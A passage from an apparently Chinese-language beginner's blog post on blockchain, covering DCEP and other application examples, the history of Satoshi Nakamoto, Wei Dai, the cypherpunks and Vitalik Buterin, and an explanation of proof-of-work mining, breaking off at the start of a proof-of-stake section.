Payment</strong></em>，DC指的是数字货币，EP指的电子支付。早在2014年，央行便开始着手DCEP的研究。2020年已在深圳、苏州、雄安、成都试点。从性质上看，DCEP，属于法定货币，是数字化的纸币，和人民币金额是1:1的关系，没有投资和投机价值。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/10.webp" alt="10"></p></li><li><p><strong>阳光链（区块链慈善）：</strong>区块链的<strong>去中心化，不可篡改和可溯源</strong>与与慈善行业的需求场景高度吻合，阳光链成为了区块链技术在慈善行业的典型应用。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/11.png" alt="11"></p></li><li><p><strong>跨境支付（跨境支付+区块链）：</strong></p><ol><li><p>🚀<strong>传统跨境支付：</strong>跨境支付涉及多种币种，存在汇率问题，传统跨境支付非常依赖于第三方机构，大致的简化模型如下图所示，存在着两个问题：</p><ol><li>流程繁琐，结算周期长</li><li>手续费高</li></ol><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/12.webp" alt="12"></p><blockquote><p>这些问题的存在，很大原因还是<strong>信息不对称</strong>，<strong>没有建立有效的信任机制</strong>。</p></blockquote></li><li><p>🚀<strong>跨境支付+区块链：</strong>区块链的引入，解决了跨境支付信息不对称的问题，并建立起一定程度的信任机制。</p><ol><li><p><strong>效率提高，费用降低：</strong>接入区块链技术后，通过公私钥技术，保证数据的可靠性，再通过加密技术和去中心，达到数据不可篡改的目的，最后，通过P2P技术，实现点对点的结算；去除了传统中心转发，提高了效率，降低了成本（也展望了普及跨境小额支付的可能性）。</p></li><li><p><strong>可追溯，符合监管需求：</strong>传统的点对点结算不能不规模应用，除了信任问题，还有就是存在监管漏洞（点对点私下交易，存在洗黑钱的风险），而区块链的交易透明，信息公开，交易记录永久保存实现了可追溯，符合监管的需求。</p></li></ol><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/13.webp" alt="13"></p></li></ol></li></ol><blockquote><p>看了这么多实际案例，不管你看明白了几个，是否对区块链的特</p><p>点与优势有了进一步的了解呢 <strong>QAQ</strong>？<img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/8.jpg" alt="8" style="zoom:20%;"></p><p>让我来考考你吧！准备好了吗🙆‍</p></blockquote><h3 id="🚀请回答出区块链的至少四个特点"><a href="#🚀请回答出区块链的至少四个特点" class="headerlink" title="🚀请回答出区块链的至少四个特点"></a><strong>🚀请回答出区块链的至少四个特点</strong></h3><hr><h2 id="3-区块链风云历史（重点）"><a href="#3-区块链风云历史（重点）" class="headerlink" title="3. 区块链风云历史（重点）"></a>3. 区块链风云历史（重点）</h2><blockquote><p> <strong>【为什么】要了解区块链的历史 ?</strong></p><p> 帅气的 <strong>Science_Jun【doge🐕】</strong>曾言：历史是一面镜子，它照亮现实，也照亮未来（好吧，其实是赵鑫珊老师说的~）</p><p> 恰如此言之意：了解一门技术的发展历程，尤其是区块链这位万众瞩目的后起之秀，正是起着<strong>继往开来以明志</strong>的作用。（好吧摊牌了，其实也是为了和你不了解区块链的朋友或同事<strong>吹牛逼</strong> 🐂）但这不是重点！<strong>重点</strong>是如果你和懂区块链的人聊了起来，当他谈起<strong>v神</strong>的传奇历史，你的脑海里却只浮现出四个字：<strong>v神是谁….？</strong>这不得尴尬地脚趾抠出三室一厅了…</p> <img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/1.jpg" alt="1" style="zoom: 33%;"></blockquote><p><a href="%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%BA%E4%B8%80%E7%A7%8D**%E6%96%B0%E5%9E%8B%E5%88%9B%E9%80%A0%E4%BF%A1%E4%BB%BB**%E6%8A%80%E6%9C%AF%EF%BC%8C%E5%AE%9E%E7%8E%B0%E4%BA%86%E7%82%B9%E5%AF%B9%E7%82%B9%EF%BC%88P2P%EF%BC%89%E7%9A%84%E4%BB%B7%E5%80%BC%E4%BC%A0%E9%80%92%EF%BC%8C%E5%8F%97%E5%88%B0%E4%BA%86%E5%BE%88%E5%A4%9A%E8%A1%8C%E4%B8%9A%E7%9A%84%E8%BF%BD%E6%8D%A7%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E7%9B%AE%E5%89%8D%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%91%E5%B1%95%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%AF%E4%BB%A5%E5%BA%94%E7%94%A8%E7%9A%84%E8%A1%8C%E4%B8%9A%E6%9C%89%E5%93%AA%E4%BA%9B%E5%91%A2%EF%BC%9F">^前言</a>: 区块链发展的历史可不是简简单单就能描述完的，真要彻头彻尾的讲完整，我想大家需要准备一下睡衣睡裤了Σ(っ °Д °;)っ所以在此之前我需要向大家提出区块链绕不开的名人，以便大家快速鸟瞰这区块链发展的长河</p><h3 id="💎中本聪-amp-Wei-Dai-——-灵光乍现的渊源"><a href="#💎中本聪-amp-Wei-Dai-——-灵光乍现的渊源" class="headerlink" title="💎中本聪&amp;Wei Dai —— 灵光乍现的渊源"></a>💎中本聪&amp;Wei Dai —— 灵光乍现的渊源</h3><blockquote><p>早在2008年11月1日，一个名叫<strong>中本聪</strong>的极客为了表达对政府肆意制造通货膨胀的不满，发表了一篇名为**<u>《比特币：一种点对点式的电子现金系统》</u>**的论文，这篇文章，标志了区块链技术的正式诞生。</p><p>然而，很多人不知道的是，其实区块链的底层构想并不是由中本聪最先提出。早在比特币诞生的前10年，就由一位名为<strong>Wei Dai</strong>的华人密码学家放在了他的一个名为<strong>B- Money</strong>的研究之中。</p></blockquote><h4 id="⭐【神秘人中本聪】"><a href="#⭐【神秘人中本聪】" class="headerlink" title="⭐【神秘人中本聪】"></a>⭐【神秘人中本聪】</h4><p> 区块链世界里最神秘的人，非比特币发明者中本聪莫属。</p><p>现在唯一可以确定的是，中本聪是比特币的第一个矿工。</p><ul><li>2009年1月3日，中本聪挖出了第一个比特币区块，也称<u>创世区块</u>，并获得了50个比特币的系统奖励。</li><li>2009年2月11日，中本聪注册了P2P Foundation，资料显示，中本聪是一个43岁的日本男性，至于该信息是真实的，还是中本聪的障眼法，不得而知。当天，中本聪在上面声称，他开发了一个叫比特币的电子现金系统，并给出了开源代码。</li><li>2010年12月5日，在维基解密泄露美国外交电报事件期间，比特币社区呼吁维基解密接受比特币捐款，以打破封锁。为保护襁褓中的比特币，中本聪义无反顾地站出来，<u>坚决反对捐款</u>，他的理由是：比特币还很弱小，经不起冲击和争议。</li><li>2010年12月12日，中本聪在比特币论坛中发表了最后一篇文章，提及了最新版本软件中的一些小问题。此后，仅通过电子邮件与比特币核心开发团队的少数人保持联系，不再公开发表任何言论。</li><li>2011年4月26日，中本聪在一封电子邮件中写道：“我已转移到其他事物上去了。”从此，中本聪的电子邮件关闭了。</li><li>2014年，Newsweek发布新闻，表示自己找到了中本聪本人——多利安·中本聪；9月13日，中本聪突然发帖否认此事，随后，多利安·中本聪也表示，自己并不是比特币创始人中本聪。</li><li>2018年11月29日，时隔多年，“中本聪”账号发布了仅有一词的状态<u>“Nour”</u>，引起比特币社区热议，但不知是黑客入侵还是真的中本聪在操作。</li></ul><p>现在，虽然有无数研究者、情报人员调查过他的真实身份，但至今未得到核实。</p><hr><p>【💎<strong>讲点有意思的，坊间关于中本聪的猜测：】</strong></p><p><strong>1、外星人</strong></p><p>有人大胆猜想，是不是像科幻电影里常见的剧情，一个月黑星高的夜晚，外星人中本聪乘坐飞碟，悄无声息地来到地球，把比特币的开源代码传到互联网上。当他的光荣使命完成后，又选择了默默地离开，不带走一片云彩。</p><p><strong>2、未来穿越者</strong></p><p>有人开脑洞地认为，中本聪可能是未来人，为了平衡目前经济社会的资本，穿越到了这个时代，创造了比特币。</p><p><strong>3、已离世</strong></p><p>有人猜想，中本聪有可能得了重病或者遭遇意外，在2011年便去世了，因此中本聪掌握的比特币私钥也一起消失了，100多万个比特币将永久沉睡。</p><p><strong>4、一个团队</strong></p><p>有人研究了比特币的代码，认为太精妙了，不像单个人所为，更像一个团队写的。可能这个团队都是顶尖人才，创造比特币是一个长久以来的计划，酝酿了几年时间，最后才慢慢成型的。</p><p><strong>5、英国人</strong></p><p>理由是，他会用很溜的英式英语，他的活动时差显示他主要生活在美国，加上他取了一个日本名字，所以说，他是披着日本外衣在美国生活的英国人。但这些特征，也可能是中本聪用的障眼法。</p><p>最后，你可能会好奇地问，有了这么伟大的成就，<a href="http://mp.weixin.qq.com/s?__biz=MzUyNzE4MDM2MA==&chksm=fa01d435cd765d2337c5f8c0b3c39cef62239509427f80e70ab129e2b2cd497fc6dca6dd638a&idx=2&mid=2247492370&scene=21&sn=8ab204a6c437a83052938abbc68e9889#wechat_redirect">有了巨大的财富</a>，为什么中本聪还要隐藏自己呀？</p><p><strong>其中一个猜测是，中本聪对去中心化的理念非常执着，他觉得只有自己消失，比特币的系统才会是安全的去中心化。</strong></p><p>不管中本聪是“他”，是“他们”，还是“它”，中本聪已经改变了这个世界，<strong>每一个为比特币做过贡献的或者正在做贡献的人，其实都是中本聪！</strong></p><p>[^想了解更多的同学来这吧~]: <a href="https://baike.baidu.com/item/%E4%B8%AD%E6%9C%AC%E8%81%AA/5740822?fr=aladdin">中本聪_百度百科 (baidu.com)</a><br>[^中本聪的那篇论文，实在有兴趣的同学可以观摩(￣▽￣)]:   <a href="%5Bbitcoin.pdf%5D(https://bitcoin.org/bitcoin.pdf)">《比特币：一种点对点式的电子现金系统》</a><br>[^以上部分内容取自]: <a href="https://blog.csdn.net/mrRqAEr7ci9s2v0/article/details/113285330">科普|中本聪到底是谁？</a></p><p>🚀大家都知道中本聪提出了区块链技术，而知道<strong>Wei Dai</strong>的人却寥寥无几，那么<strong>Wei Dai</strong>到底是何方神圣？</p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/Users\施万俊0728\Desktop\区块链blog图片\重点.webp" alt="重点" style="zoom: 33%;"><p>🚀说起<strong>Wei Dai</strong>，那么便绕不开一个神秘的组织——<strong>密码朋克</strong>！</p><hr><h3 id="💎密码朋克——区块链的重要精神先驱"><a href="#💎密码朋克——区块链的重要精神先驱" class="headerlink" title="💎密码朋克——区块链的重要精神先驱"></a>💎密码朋克——区块链的重要精神先驱</h3><blockquote><p>​         在比特币之前，区块链的很多基础技术概念其实都来自于一个于1993年成立的神秘邮件列表组织——<strong>密码朋克（Cypherpunk）</strong>。</p><p>​         密码朋克是一个<strong>提倡使用强加密算法来保持个人隐私安全的“极客组织”</strong>，其成员有很多我们如今耳熟能详的计算机大佬们，包括维<strong>基解密的创始人朱利安·阿桑奇、“万维网之父”蒂姆伯纳斯·李、Facebook的原创始人肖恩·帕克等等，当然，也包括Wei Dai和中本聪。</strong></p><p>​         早在上个世纪90年代末，密码朋克就诞生了很多对日后区块链影响深远的基础构想和技术，包括亚当·贝克发明的<strong>PoW算法</strong>、斯图尔特·哈伯和斯科特·斯托内塔提出的用时间戳方法保证数字文件安全的协议，Wei Dai所提出的匿名、分布式的电子加密货币系统等。<strong>因此从某种程度上来说，区块链技术其实并不是中本聪灵光乍现的原始发明，而是对密码朋克群组一系列技术的集大成。</strong></p><p>​         其中，Wei Dai所提出的B-money构想可以说是<strong>区块链的重要精神先驱</strong>。[B-money可以理解为用B换钱，这样就好记了(<em>^_^</em>)]</p><p>​          <strong>B-money 的设计在很多关键的技术特质上与比特币非常相似。</strong>它率先提出了分布式账本的理念，要求所有的账户持有者共同决定计算量的成本并就此达成一致意见，并首次引入了<strong>PoW机制、数字签名、P2P交易、智能合约、身份验证</strong>等概念。</p><p>​         但作为一个并不完备的构想，当时的B-money在很多内容上都是浅尝辄止，在共识模型、奖惩机制、货币的创造等方面没有提出详细的解决方案，因此只是停留在了设计层面并没有付诸实践，在当时也没有引起很大的水花。</p><p>​         一直到2008年，中本聪<strong>基于前人的各种想法开始设计比特币</strong>。整理成文后他首先将文章发给了<strong>PoW算法</strong>的发明者亚当·贝克，亚当·贝克看完后发现比特币的运行机制跟Wei Dai多年前提出的B-Money有很多相似之处，于是建议中本聪要引用一下B-Money。<strong>接着，中本聪去认真研读了B-Money后也惊奇地发现早在十年前Wei Dai就和自己有了几乎一样的想法，同时又借鉴了B-Money里的一些机制对比特币进行了完善。</strong></p></blockquote><p>⚽想要进一步了解B-money这一<strong>创世的构想</strong>，可以去参考这篇文章 <a href="https://www.panewslab.com/zh/articledetails/D44115590.html">WeiDai的B-Money，也许是比特币的初稿</a></p><h4 id="⭐【纪念WeiDai】"><a href="#⭐【纪念WeiDai】" class="headerlink" title="⭐【纪念WeiDai】"></a>⭐【纪念WeiDai】</h4><p>📕很可惜，<strong>Wei Dai</strong>到如今都仍是以神秘人的身份出现在世人目光范围里，且只有极少数人知道他，或许这就是属于一代极客的浪漫——<u>“事了拂衣去，深藏功与名”</u>。B-money是密码朋克社区对研发数字世界中的独立自主的货币的又一次探索，2013年，Vitalik Buterin一手构建的以太坊（Ethereum）最小单位<strong>Wei</strong>，便以他的名字命名。</p><ul><li>向勇于探索的前辈致敬<img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/3.jpg" alt="3" style="zoom:25%;"></li><li>知道他你就可以和你的区块链朋友一起吹🐂了[doge]</li></ul><h3 id="💎Vitalik-Buterin——鲜衣怒马少年时"><a href="#💎Vitalik-Buterin——鲜衣怒马少年时" class="headerlink" title="💎Vitalik Buterin——鲜衣怒马少年时"></a>💎Vitalik Buterin——鲜衣怒马少年时</h3><p><strong>简介：</strong>我想用<strong>鲜衣怒马少年时</strong>来描述V神比较合适：</p><ul><li><p>5岁时便开始接触编程语言</p></li><li><p>7岁独自创建了一个叫“兔子百科全书”的复杂文档</p></li><li><p>12岁起就用C++编写给自己玩的小游戏</p></li><li><p>13-16岁青春期网瘾少年，沉迷<strong>魔兽世界</strong></p><p>（终于找到和我一样的经历了&#x2F;(ㄒoㄒ)&#x2F;~~）</p></li><li><p>网瘾少年到一代神话的奇幻转折 </p></li><li><p>17岁从父亲口中听说到比特币</p></li><li><p>省略一万字……………………..</p></li><li><p>25岁身价上百亿美元</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/18.webp" alt="18"></p></li></ul><blockquote><p>Vitalik Buterin，就是我们常说的V神，区块链世界传奇⼈物，⾝家⼀度超过了巅峰时期的马云。</p><p>Vitalik Buterin的成功来⾃两个⽅⾯：⼀是从⼩就展现出来的过⼈智商和⾮凡天赋，他只花了⼏个⽉的时间，就学会了加拿⼤当地的语⾔，甚⾄在⾝边的伙伴还懵懵懂懂的时候，Buterin已经⽤他4岁时收到的礼物——⼀台个⼈电脑撰写⾃⾏计算的程序了；另⼀⽅⾯则是碰上了难得⼀遇的好时机——区块链时代的到来！</p><p>Vitalik Buterin，1994年出⽣于俄罗斯，5岁的时候，⽗母离婚，跟随⽗亲移民到了加拿⼤。他⾃⼩在数学上就有很⾼的天赋，在⼤部分⼈九九乘法表还没背全的时候，Buterin的三位数⼼算速度已经是同龄⼈的两倍。在⼩学三年级的时候，他便被安排进了“天才⼉童班”，学习数学、编程和经济学等科⽬。</p><p>7岁的时候，Buterin创建了⼀个叫做”兔⼦百科全书“的复杂⽂档，这是⼀个由兔⼦组成的⼩世界，但世界⾥的规则符合⾮常严格的公式，⾥⾯全是数学，图表和计算。Buterin读五六年级的时候，很多⼈认为他是数学天才。12岁起，Buterin已经可以⽤程式语⾔C++撰写简单的游戏给⾃⼰玩了。</p><p>这样⼀路成长下去，Buterin或许就成为⼀名优秀的程序员了，但事情往往却⼀波三折。在13岁到16岁的时候，Buterin沉迷于《魔兽世界》中，摇⾝⼀变成了⼀个⽹瘾少年，经常⼀玩游戏就是⼀整天。直到</p><p>【<u><strong>有⼀次暴雪在版本更新中，取消了Buterin最喜爱的⾓⾊——术⼠的“⽣命虹吸”技能，使得Buterin悲痛欲绝，并多次发邮件和在官⽅论坛⾥联系了暴雪的⼯程师，要求他们还原这个技能，但是得到的回复都是出于游戏平衡才这么做的，不能恢复。</strong></u></p><p><u><strong>Buterin对这种中⼼化组织主导⼀切的状况产⽣了不满。在互联⽹游戏⾥，最⼤弊端就是⼀切由开发商说了算，⽽玩家只能选择被动接受，或者离开。所以，他选择了放弃玩魔兽。</strong></u>】</p><p>2011年，17岁的Buterin从他⽗亲那听到了⽐特币，⼀开始他和当时的⼈们⼀样，并不认为⽗亲兴奋提及的数字货币有任何实际价值。Buterin的⽗亲是⼀家区块链孵化器Blockgeeks Labs的<strong>联合创始⼈</strong>。这位送给他第⼀台电脑、买给他电脑科学书籍的⽗亲，也是⼀路以来⿎励他探索的启蒙导师和伙伴。<u>在他⽗亲宣扬下，Buterin<strong>开始认识到了⽐特币的真正意义所在，并被区块链技术的去中⼼化属性给深深地吸引了</strong>。</u></p><p>基于对⽐特币及区块链技术的浓厚兴趣，Buterin开始在⽹络上撰写相关的⽂章，主要涉及到区块链技术以及潜在的社会影响，彼时的他还未满18岁。Buterin的⽂章很受欢迎，每篇帖⼦⼤概能得到5个⽐特币（时价4美元左右）的“打赏”。2011年9⽉，Buterin以联合创始⼈以及主要撰稿⼈的⾝份会同罗马尼亚程序员Mihai Alisie创建了“⽐特币杂志”，这是⼀份实体和在线的出版物，直到2015年被收购前，该杂志积累了⼤概150万名读者。</p><p>Buterin19岁时，也就是2013年的时候，被加拿⼤滑铁卢⼤学（计算机专业世界排名第18位）录取，学习计算机科学。<u>但8个⽉后，Buterin便选择了和⽐尔盖茨和扎克伯格⼀样的道路——辍学</u>，毅然踏上了周游世界之路，与世界各地的区块链爱好者交流和互相学习，⽽他的⽗亲对此也是乐见其成。这段时间正值⽐特币第⼀个爆发期，短时间内1btc的价格从⼏⼗美元上涨到1000多美元，这为Buterin带来了⼈⽣的第⼀桶⾦。</p><p>2013年年末，周游世界归来后的Buterin有了些新想法。当时的⽐特币爱好者正在全⼒以赴地为⽐特币增加更多的功能性，打造⽐特币2.0。但Buterin认为，建⽴⼀个全新的编程语⾔才是⽐特币的当务之急。<u>出于安全原因，⽐特币的开⼭⿐祖中本聪⽤了⼀种复杂的脚本语⾔编写了⽐特币协议，然⽽这种语⾔有意地限制了交易的复杂性，也导致了⽐特币⼀直没有开枝散叶，孵化出更多的应⽤。</u></p><p>针对这种状况，<u>Buterin打算⽤⼀种<strong>通⽤的脚本语⾔</strong>，打造⼀款新的计算平台和新的加密货币，于是他很快就写下了⼀篇⽩⽪书，并在⽂中介绍了以太坊。19岁的Vitalik Buterin给他的好友们发了以太坊⽩⽪书。这款新的⽐特币将基于通⽤的编程语⾔，可以⽤来创建各种各样的应⽤，⽐如社交、交易、游戏……Buterin发给了15个⼈，这15个⼈⼜相继发给了他们的好友。⼀传⼗，⼗传百，Buterin的想法很快就在⽐特币社区⾥获得了⼀致的好评。</u></p><p>和其他的加密货币⼀样，<u>Buterin决定⽤ICO的⽅式进⾏众筹</u>，⽤户可以⽤⽐特币来预购以太币。以太币的定价是2000个以太币 1个⽐特币，按照当时每个⽐特币600美元的价格，⼀个以太币是0.3美元。</p><p>最终，这次ICO⼀共募集了31,000个⽐特币，即1,800万美元，这让它成为了加密货币历史上价值第⼆⾼的ICO。有了这笔钱，Buterin的团队很快在瑞⼠成⽴⼀家⾮盈利公司Ethereum Foundation。<u>Buterin也因为对⽐特币2.0的发展贡献，从⽽击败了Facebook创始⼈Mark Zuckerberg，获得2014年IT软件类世界技术奖。这个奖项表彰了V神设计发展以太坊（Ethereum）的突出成就。</u></p><p>2015年6⽉，第⼀款以太坊发布，取名Frontier，所有承诺给早期投资者的以太币被顺利地交付，开发者们也开始在以太坊上编织他们的梦想。两年间，以太坊的出现激活了区块链背后的巨⼤潜⼒：以太币的价格在2017全年翻了85倍；由以太坊奠基的ICO在2017年成为最⽕的资⾦众筹⽅式，全球通过ICO募集了超过40亿美元；</p><p><u>2017年，全球电⼦货币的市场总值从年初的180亿美元暴涨到5600亿美元。</u></p></blockquote><p>[^ICO]: Initial Coin Offering，首次币发行，源自股票市场的首次公开发行（IPO）概念，是区块链项目首次发行代币，募集比特币、以太坊等通用<a href="https://baike.baidu.com/item/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81/8159530">数字货币</a>的行为。</p><h3 id="💎时间节点——区块链的跨时代"><a href="#💎时间节点——区块链的跨时代" class="headerlink" title="💎时间节点——区块链的跨时代"></a>💎<strong>时间节点——区块链的跨时代</strong></h3><ol><li><p><em><strong>区块链1.0时代（2009-2013）：</strong></em></p><p>⭐标志事件：署名为“中本聪”的匿名人士发表论文《比特币：对等网络电子现金系统》，标志着区块链的世界打开大门。</p><p>⭐阶段特点：该阶段主要关注数字货币的回报率，而非其应用价值。</p></li><li><p><em><strong>区块链2.0时代（2014-2017）：</strong></em></p><p>⭐标志事件：2013年11月，V神发布了以太坊白皮书，区块链的特性形成了信任基础。</p><p>⭐阶段特点：为智能合约提供了可信任的执行环境，扩大了对金融领域更广泛的场景和流程进行优化的应用，使得所有金融交易都可以被改造成在区块链上使用。以太坊与比特币的最大区别，是其支持脚本语言应用开发，可以实现智能合约。</p></li><li><p><em><strong>区块链3.0时代（2018-至今）：</strong></em></p><p>⭐标志事件：2017年底起，稳定币USDT的交易开始显著放量，2017年12月，借贷类DeFi项目MakerDAO上线，其中也用到了稳定币的技术。</p><p>⭐阶段特点：3.0时代是超越货币和金融范围的泛行业去中心化应用，特别是在政府、医疗、科学、文化和艺术等领域的应用。</p></li></ol><h3 id="🌙跨时代总结"><a href="#🌙跨时代总结" class="headerlink" title="🌙跨时代总结"></a><strong>🌙跨时代总结</strong></h3><p>​        <strong>实际上不难看出，区块链的跨时代实际上就是三种数字货币的诞生与爆发：1.0是最早的比特币（BTC）创世，开辟区块链时代，为天才少年V神的横空出世奠定了时代基础；2.0是以太坊（Ethereum）的信任机制建立，区块链的无限可能性在此萌芽，为USDT的交易奠定了信任基础；3.0则是泰达币（USDT）交易的放量增长，为后续区块链技术的衍生提供了价值基础；因此在当今所有交易所我们都可以看到，只有这三种数字货币一直是首页大屏的“不动明王”，并且价值排序是呈阶梯型递减的，在我看来，未来也难以撼动他们的地位。我们是不是可以推断：能够越早占据时间长河的前瞻位置，也就能越早地掌握经久不衰的财富密码。因此，在持久学习的道路上，掌握技术能够让你站稳脚跟，而回望历史则是站在时代巨人的肩上去目睹苦难和机遇并存，去仰望星空，开拓视野，进而去探索宇宙；这，就是为什么我要去介绍区块链发展历史的真正缘由。</strong></p><h3 id="🌙畅想未来"><a href="#🌙畅想未来" class="headerlink" title="🌙畅想未来"></a><strong>🌙畅想未来</strong></h3><p><strong>畅想一下区块链4.0时代的到来是因为什么？</strong></p><p>[^部分内容来自于]: <a href="https://blog.csdn.net/mrRqAEr7ci9s2v0/article/details/113285330">科普 | 比特币创始人中本聪是谁？</a></p><h2 id="4-【挖矿】到底是什么——区块链的核心技术"><a href="#4-【挖矿】到底是什么——区块链的核心技术" class="headerlink" title="4.【挖矿】到底是什么——区块链的核心技术"></a>4.【挖矿】到底是什么——区块链的核心技术</h2><h3 id="💎挖矿，到底是什么？（引言）"><a href="#💎挖矿，到底是什么？（引言）" class="headerlink" title="💎挖矿，到底是什么？（引言）"></a>💎挖矿，到底是什么？（引言）</h3><p><strong>简短概括：</strong>挖矿——就是通过贡献计算机的计算力来换取虚拟货币的奖励。这么说确实略显抽象，别着急，咱先走为上。</p><p>提起挖矿，大家最近是否注意到一个现象：<strong>电脑显卡的价格暴涨，</strong>迎来了十几年来的一次价格高峰；俗话说，物以稀为贵，供求关系不平衡才会如此，那么谁是罪魁祸首呢？毫无疑问——矿机！挖矿需要矿机来作为硬件基础，而矿机的核心性能取决于显卡，矿工们为了更好地争夺虚拟货币的奖励，就不得不买算力更加强大的矿机，也就意味着更好的显卡，消耗更多的电费。这些，就是在挖矿中最重要的<strong>物理基础。</strong></p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/15.webp" alt="15"></p><p>那么，挖矿的物理基础有了，挖矿的规则是什么来决定的呢？答案就是PoW工作量证明机制，请随我来~</p><h3 id="💎共识机制——区块链的信任基础"><a href="#💎共识机制——区块链的信任基础" class="headerlink" title="💎共识机制——区块链的信任基础"></a>💎共识机制——区块链的信任基础</h3><h4 id="A-PoW（Proof-of-Work）工作量证明机制"><a href="#A-PoW（Proof-of-Work）工作量证明机制" class="headerlink" title="A. PoW（Proof of Work）工作量证明机制"></a>A. PoW（Proof of Work）工作量证明机制</h4><p>上面的例子并不是题外话，相信聪明的你早已窥见了端倪，这实际上就是PoW机制的过程简述。</p><p>📕<em><strong>PoW：</strong></em> 也称挖矿，它是需要完成一定的工作量（Hash计算）来证明获取记账权。它是最早应用在区块链技术上的共识机制，也是区块链应用领域使用最为广泛、最为成熟的共识机制。比特币区块链系统就是使用PoW共识机制。</p><p><strong>📕PoW算法在区块链实现过程：</strong></p><ol><li><p>先定义一个固定的256位长度初始数，比如：长度为256位的 0000…0001 （<strong>相当于32字节，64字符，一字节为8位，一字符为4位</strong>）</p></li><li><p>设置难度系数值，比如：如果难度系数定义为前面4个0，即16位长度（0000 0000 0000 0001 &#x3D; 4个字符&#x3D; 2个字节）</p></li><li><p>按照难度系数值进行<strong>移位操作</strong>，将Hash工作量值扩大， 向左移 （256-难度系数N位）比如： 将初始数 0000…..0001 向左移（256-16位）得到： 0000 0000 0000 0001 0000 …0000.</p></li><li><p>将随机数Nonce递增加1再加上区块头（Block Header）Hash值拼接，然后进行SHA256 Hash运算。</p></li><li><p>将计算结果值与当前难度系数目标值做对比，<strong>如果当前计算值大于难度系数条件值，即继续递增Nonce值再进行下一次的SHA256 Hash运算</strong>，直到计算出的结果Hash值少于目标值，则才认为解题成功，此次的工作量证明完成并获得记账权，然后进行对交易区块进行打包确认并广播给全节点。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/20.png" alt="20"></p></li></ol><p>[^Nonce]: Nonce是Number once的缩写，在密码学中Nonce是一个只被使用一次的任意或非重复的随机数值。</p><h5 id="📕简单理解五步曲："><a href="#📕简单理解五步曲：" class="headerlink" title="📕简单理解五步曲："></a>📕简单理解五步曲：</h5><p>Looping （循环）{</p><ol><li>准备初始数据</li><li>设置难度系数</li><li>通过SHA256 对数据进行Hash</li><li>将Hash转成大整数（big.Int）</li><li>将大整数与难度系数目标值比较。</li></ol><p>}</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/19.png" alt="19"></p><p>📕<em><strong>公式表达：</strong></em><br>$$<br>SHA256 ( Nonce + blockheader ） &lt;  目标值的难度系数<br>$$<br>📕<em><strong>优点：</strong></em></p><ol><li>完全去中心化；</li><li>节点自由进出，有利于节点网络扩大；</li><li>用户的参与度与信任度高，对于用户来说实现真正的公平，公正竞争。</li></ol><p>📕<em><strong>缺点：</strong></em></p><ol><li>最大缺点就是造成的资源浪费，争夺记账权需要不停地循环计算哈希值；</li><li>达成共识的周期过长，<strong>导致产生新区块效率比较低</strong>，大概每10分钟才产生一个新区块，这不适于商业应用。</li></ol><h4 id="B-PoS机制（Proof-of-Stake）权益证明机制"><a href="#B-PoS机制（Proof-of-Stake）权益证明机制" class="headerlink" title="B. PoS机制（Proof of  Stake）权益证明机制"></a>B. PoS机制（Proof of  Stake）权益证明机制</h4><p><a href="%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%BA%E4%B8%80%E7%A7%8D**%E6%96%B0%E5%9E%8B%E5%88%9B%E9%80%A0%E4%BF%A1%E4%BB%BB**%E6%8A%80%E6%9C%AF%EF%BC%8C%E5%AE%9E%E7%8E%B0%E4%BA%86%E7%82%B9%E5%AF%B9%E7%82%B9%EF%BC%88P2P%EF%BC%89%E7%9A%84%E4%BB%B7%E5%80%BC%E4%BC%A0%E9%80%92%EF%BC%8C%E5%8F%97%E5%88%B0%E4%BA%86%E5%BE%88%E5%A4%9A%E8%A1%8C%E4%B8%9A%E7%9A%84%E8%BF%BD%E6%8D%A7%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E7%9B%AE%E5%89%8D%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%91%E5%B1%95%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%AF%E4%BB%A5%E5%BA%94%E7%94%A8%E7%9A%84%E8%A1%8C%E4%B8%9A%E6%9C%89%E5%93%AA%E4%BA%9B%E